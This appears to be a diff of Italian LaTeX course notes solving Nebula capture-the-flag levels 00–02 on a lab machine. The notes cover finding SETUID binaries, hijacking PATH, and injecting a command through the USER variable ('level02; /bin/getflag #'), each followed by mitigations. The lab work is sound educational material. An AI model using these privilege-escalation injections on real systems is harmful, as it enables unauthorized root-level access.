@@ -35,11 +35,240 @@ Noi accederemo sempre come utente levelN, con l'obiettivo di:
 
 Raggiunto l'obiettivo, si cattura la bandierina, per questo motivo le sfide prendono il nome di CTF.
 
+% ------------------ 
+% NEBULA LEVEL00
+% ------------------ 
 \section{Level00}
-Dalla pagina ufficiale si legge:
-This level requires you to find a Set User ID program that will run as the “flag00” account.
+\subsection{Obiettivo}
+Eseguire \textbf{/bin/getflag} con privilegi di \textbf{flag00}.
+\subsection{Idea per risolvere la sfida}
+Usiamo comando: 
+\begin{lstlisting}[style=bashstyle]
+    find / -perm /u+s 2>/dev/null | grep flag00
+\end{lstlisting}
+Tra i vari risultati notiamo il file: 
+\begin{lstlisting}[style=bashstyle]
+    /bin/.../flag00
+\end{lstlisting}
+Visualizziamo i metadati del file trovato con il comando:
+\begin{lstlisting}[style=bashstyle]
+    ls -l
+\end{lstlisting} 
+Notiamo che è di proprietà di \textbf{flag00} e ha \textbf{SETUID} acceso.
+Mandiamo in esecuzione il file con il comando: 
+\begin{lstlisting}[style=bashstyle]
+    /bin/.../flag00
+\end{lstlisting} 
+Verremo autenticati come utente flag00 e quindi vinceremo la sfida eseguendo:
+\begin{lstlisting}[style=bashstyle]
+    /bin/getflag
+\end{lstlisting}
 
-Quindi dobbiamo trovare un programma con il SETUID acceso che sarà eseguito come se fossimo flag00.
 
-Il primo passo e cercare nella directory principale tutti i programmi con il bit SETUID accesso. Usiamo quindi il comando \text
+% ------------------ 
+% NEBULA LEVEL01
+% ------------------ 
+\section{Level01}
+\subsection{Obiettivo}
+Eseguire \textbf{/bin/getflag} con privilegi di \textbf{flag01}.
+\subsection{Ispezione directory}
+Controlliamo le directory \textbf{/home/level01} e \textbf{/home/flag01}. Notiamo che \textbf{/home/flag01} contiene l’eseguibile \textbf{flag01}.
+Analizziamo i metadati del file \textbf{flag01} con: 
+\begin{lstlisting}[style=bashstyle]
+    ls -l
+\end{lstlisting}
+Si scopre che il file in questione è di proprietà di \textbf{flag01} e ha \textbf{SETUID} acceso.
+\subsection{Analisi sorgente}
+\begin{itemize}
+    \item Imposta tutti gli user ID al valore effettivo (elevazione dell’utente al valore associato a flag01) 
+    \item Imposta tutti i group ID al valore effettivo (elevazione del gruppo al valore associato a level01) 
+    \item Esegue un comando, tramite la funzione di libreria \textbf{system():} \begin{lstlisting}[style=cstyle]
+        system("/usr/bin/env echo and now what?");
+    \end{lstlisting}
+\end{itemize}
+Leggendo il manuale di \textbf{system()} capiamo che in questa sfida il problema è l’utilizzo della \textbf{system()} in un programma con \textbf{SETUID} acceso, e che giocando con le variabili di ambiente si può violare la sicurezza del programma.
+Un altro punto importante è che la \textbf{system()} non funziona correttamente se \textbf{/bin/sh} corrisponde a \textbf{bash}. Quindi controlliamo con il comando: 
+\begin{lstlisting}[style=bashstyle]
+    ls -l /bin/sh
+\end{lstlisting} 
+e notiamo proprio che sh punta a bash.
 
+La \textbf{system()} non fa altro che utilizzare sh per eseguire un comando, tale comando viene eseguito da un processo figlio che eredita i privilegi del padre.
+Dopodiché \textbf{/usr/bin/env} esegue il comando successivo ovvero echo, quindi per vincere la sfida ci basta inoculare /bin/getflag al posto di echo.
+
+\subsection{Idea per risolvere la sfida}
+Copiamo \textbf{/bin/getflag} in una cartella temporanea \textbf{tmp} e diamogli nome \textbf{echo} con il comando: \begin{lstlisting}[style=bashstyle]
+    cp /bin/getflag /tmp/echo
+\end{lstlisting}
+Alteriamo il percorso di ricerca delle variabili d'ambiente in modo da preporre \textbf{/tmp} alla lista delle variabili d'ambiente con il comando: 
+\begin{lstlisting}[style=bashstyle]
+    PATH=/tmp:$PATH
+\end{lstlisting}
+Questo è quello che succede:
+\begin{itemize}
+    \item Il comando env prova a caricare il file eseguibile echo
+    \item Poiché echo non ha un percorso assoluto, sh usa i percorsi di ricerca per individuare il file da eseguire 
+    \item sh individua /tmp/echo come primo candidato all’esecuzione, dato che l'abbiamo posto per primo
+    \item sh esegue /tmp/echo con i privilegi dell’utente flag01
+\end{itemize}
+
+\subsection{Sintesi comandi da eseguire}
+I comandi da eseguire sul terminale della macchina sono i seguenti:
+\begin{lstlisting}[style=bashstyle] 
+    # copia getflag in echo
+    cp /bin/getflag /tmp/echo
+    # aggiorna PATH
+    PATH=/tmp:$PATH
+    # esegui flag01
+    /home/flag01/flag01
+\end{lstlisting}
+Vinciamo la sfida.
+
+\subsection{Debolezze}
+\begin{itemize}
+    \item privilegi di esecuzione ingiustamente elevati
+    \item versione bash che non abbassa i privilegi di esecuzione
+    \item manipolazione variabile PATH
+\end{itemize}
+
+\subsection{Mitigazioni}
+\begin{enumerate}
+    \item Spegnere bit SETUID:
+    \begin{itemize}
+        \item autenticarsi come root e avviare una shell con il comando: \begin{lstlisting}[style=bashstyle] 
+        sudo -i
+        \end{lstlisting}
+        \item spegnere SETUID con il comando: \begin{lstlisting}[style=bashstyle] 
+        chmod u-s /home/flag01/flag01
+        \end{lstlisting}   
+        \item Eseguiamo flag01 e noteremo che l’attacco non va a buon fine. 
+    \end{itemize}
+    \item Modificare sorgente level01.c:
+    \begin{itemize}
+        \item usare putenv() per rimuover /tmp da PATH:
+        \begin{lstlisting}[style=cstyle]
+        putenv("PATH=/bin:/sbin:/usr/bin:usr/sbin");
+        \end{lstlisting}
+        \item compiliamo con il comando:
+        \begin{lstlisting}[style=bashstyle]
+        gcc -o flag01-env level01-env.c
+        \end{lstlisting}
+        \item impostiamo i privilegi sul nuovo file con:
+        \begin{lstlisting}[style=bashstyle]
+        chown flag01:level01 /home/flag01/flag01-env 
+        chmod u+s /home/flag01/flag01-env   
+        \end{lstlisting}
+        \item Impostiamo PATH e riproviamo l'attacco
+        \begin{lstlisting}[style=bashstyle]
+        PATH=/tmp:$PATH  
+        \end{lstlisting} 
+        \item Eseguiamo flag01-env e noteremo che l’attacco non va a buon fine.
+    \end{itemize}   
+\end{enumerate}
+
+
+% ------------------ 
+% NEBULA LEVEL02
+% ------------------ 
+\section{Level02}
+\subsection{Obiettivo}
+Eseguire \textbf{/bin/getflag} con privilegi di \textbf{flag02}.
+\subsection{Ispezione directory}
+Controlliamo le directory \textbf{/home/level02} e \textbf{/home/flag02}. Notiamo che \textbf{/home/flag02} contiene l’eseguibile \textbf{flag02}.
+Analizziamo i metadati del file \textbf{flag02} con: 
+\begin{lstlisting}[style=bashstyle]
+    ls -l
+\end{lstlisting}
+Si scopre che il file in questione è di proprietà di \textbf{flag02} e ha \textbf{SETUID} acceso.
+
+\subsection{Analisi sorgente}
+\begin{itemize}
+    \item Imposta tutti gli user ID al valore effettivo (elevazione dell’utente al valore associato a \textbf{flag02}).
+    \item Imposta tutti i group ID al valore effettivo (elevazione del gruppo al valore associato a \textbf{level02}).
+    \item Alloca un buffer e ci scrive dentro alcune cose, tra cui il valore di una variabile di ambiente (\textbf{USER}).
+    \item Stampa una stringa e il contenuto del buffer.
+    \item Esegue il comando contenuto nel buffer tramite \texttt{system}.
+\end{itemize}
+La funzione di libreria \textbf{asprintf()}:
+\begin{itemize}
+    \item Alloca un buffer di lunghezza adeguata.
+    \item Copia una stringa nel buffer utilizzando la funzione \textbf{sprintf()}.
+    \item Restituisce il numero di caratteri copiati (e -1 in caso di errore).
+\end{itemize}
+Nel sorgente level02.c non è possibile usare l’iniezione di comandi tramite PATH. Al contrario di quanto accadeva in level01.c, in level02.c il path del comando è scritto esplicitamente: \textbf{/bin/echo}
+
+\subsection{Idea per risolvere la sfida}
+L’idea qui è quella di modificare \textbf{USER} in modo da modificare buffer.
+In BASH è possibile concatenare due comandi con il carattere separatore \textcolor{red}{;} quindi: 
+\begin{lstlisting}[style=bashstyle]
+    echo comando1; echo comando 2
+\end{lstlisting}
+Impostiamo USER come segue: 
+\begin{lstlisting}[style=bashstyle]
+    USER='level02; /bin/getflag'
+\end{lstlisting}
+Se eseguiamo flag02 l’attacco fallisce perché dopo \textbf{/bin/echo level02; /bin/getflag} c’è la stringa \textbf{is cool}
+Per evitare questo usiamo il \textcolor{red}{\#} per commentare. 
+Quindi sovrascriviamo USER come segue:
+\begin{lstlisting}[style=bashstyle]
+    USER='level02; /bin/getflag #'
+\end{lstlisting}
+
+\subsection{Sintesi comandi da eseguire}
+\begin{lstlisting}[style=bashstyle]
+    # Modifica variabile USER
+    USER='level02; /bin/getflag #'
+    # Esegui flag02
+    /home/flag02/flag02
+\end{lstlisting} 
+Vinciamo la sfida.
+
+\subsection{Debolezze}
+\begin{itemize}
+    \item privilegi di esecuzione ingiustamente elevati
+    \item versione bash che non abbassa i privilegi di esecuzione
+    \item non vengono neutralizzati i caratteri speciali
+\end{itemize}
+
+\subsection{Mitigazioni}
+\begin{enumerate}
+    \item Spegnere bit SETUID:
+    \begin{itemize}
+        \item autenticarsi come root e avviare una shell con il comando: \begin{lstlisting}[style=bashstyle] 
+        sudo -i
+        \end{lstlisting}
+        \item spegnere SETUID con il comando: \begin{lstlisting}[style=bashstyle] 
+        chmod u-s /home/flag01/flag01
+        \end{lstlisting}   
+        \item Eseguiamo flag01 e noteremo che l’attacco non va a buon fine. 
+    \end{itemize}
+    \item Ottenere username corrente con funzioni di libreria o sistema. Modifichiamo quindi il sorgente level02.c con la funzione di sistema\textbf{getlogin()}, che restituisce il puntatore ad una stringa contenete il nome dell’utente che sta lanciando il processo.
+    \begin{lstlisting}[style=cstyle]
+    char *username; 
+    username=getlogin(); 
+    asprintf(&buffer, "/bin/echo %s is cool", username);
+    \end{lstlisting}
+    Compiliamo il nuovo sorgente con:
+    \begin{lstlisting}[style=bashstyle]
+    gcc -o flag02-getlogin level02-getlogin.c
+    \end{lstlisting}
+    Impostiamo i privilegi su flag02-getlogin con:
+    \begin{lstlisting}[style=bashstyle]
+    chown flag02:level02 /path/to/flag02-getlogin 
+    chmod 4750 /path/to/flag02-getlogin
+    (4750 corrisponde a rwsr-x---)
+    \end{lstlisting}
+    Eseguiamo flag02-getlogin, non vinciamo la sfida.
+    \item Un’altra mitigazione si effettua tramite la funzione \textbf{strpbrk()}. Aggiungiamo nel codice:
+    \begin{lstlisting}[style=cstyle]
+    const char invalid_chars[] = "!\"$&'()*,:;<=>?@[\\]^`{|}";
+    \end{lstlisting}
+    e dopo la \textbf{asprintf()}
+    \begin{lstlisting}[style=cstyle]
+    if ((strpbrk(buffer, invalid_chars)) != NULL) { 
+    perror("strpbrk"); 
+    exit(EXIT_FAILURE); 
+    }
+    \end{lstlisting}
+\end{enumerate}
+Quindi compiliamo e impostiamo i privilegi come per la prima mitigazione ed eseguiamo. La sfida non verrà vinta.
